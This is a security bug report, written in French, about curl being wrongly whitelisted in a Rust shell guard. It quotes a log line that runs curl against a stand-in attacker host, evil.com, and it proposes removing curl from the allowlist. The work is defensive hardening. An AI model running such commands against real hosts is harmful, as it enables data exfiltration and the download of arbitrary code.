# 🔐 Security Bug - curl Whitelist Issue

**Date:** 2026-01-07
**Severity:** ⚠️ MEDIUM
**Status:** 🔴 OPEN
**Component:** `security/shell_guard.rs`

---

## 📋 Description

Le test `test_unauthorized_command_blocked` échoue car `curl` est **whitelisté** alors qu'il ne devrait pas l'être.

### Test Failure

```
test test_unauthorized_command_blocked ... FAILED

thread 'test_unauthorized_command_blocked' panicked at tests/security_tests.rs:42:5:
curl n'est pas whitelisté
```

### Evidence

**Log d'exécution:**
```
[SECURITY:SHELL] Executing: curl http://evil.com
```

`curl` est **exécuté** au lieu d'être bloqué, indiquant qu'il passe la whitelist.

---

## 🎯 Impact

**Risque:** ⚠️ **MEDIUM**

- `curl` peut télécharger du contenu arbitraire
- Potentiel vecteur d'attaque pour exfiltration données
- Commande pas critique pour fonctionnement TITANE∞

**Mitigations existantes:**
- ✅ Arguments toujours validés
- ✅ Pas d'injection shell (shell_injection test passe)
- ✅ Sandboxing partiel actif

---

## 🔧 Recommandation Fix

### Option A: Retirer curl de whitelist ✅ RECOMMANDÉ

**Fichier:** `src-tauri/src/security/shell_guard.rs`

**Action:**
```rust
// AVANT:
WHITELISTED_COMMANDS = ["espeak", "whisper", "curl", ...];

// APRÈS:
WHITELISTED_COMMANDS = ["espeak", "whisper", ...];  // curl retiré
```

**Effort:** 5min
**Risque:** Très faible (curl pas utilisé par features)

### Option B: Ajouter validation strict URLs

**Action:** Limiter curl aux URLs HTTPS safe
**Effort:** 30min
**Risque:** Moyen (peut casser features)

---

## 📊 Tests Impactés

```
test_unauthorized_command_blocked ... FAILED (attendu: curl bloqué)
test_whitelisted_command_allowed ... OK (ne teste pas curl)
```

**Total tests security:** 10 (9 pass, 1 fail)
**Coverage security:** 90%

---

## 🎯 Action Items

- [ ] **Vérifier usage curl** dans codebase (grep)
- [ ] **Retirer de whitelist** si non utilisé
- [ ] **Fix test** `test_unauthorized_command_blocked`
- [ ] **Rerun security tests** (10 tests)
- [ ] **Update whitelist docs**

**Estimé:** 15-30min
**Priorité:** Phase 2 ou 3 (non-bloquant)

---

**Créé:** 2026-01-07 during Phase 2 analysis
**Assigné:** Phase 2 security hardening
**Ref Test:** `tests/security_tests.rs:42`
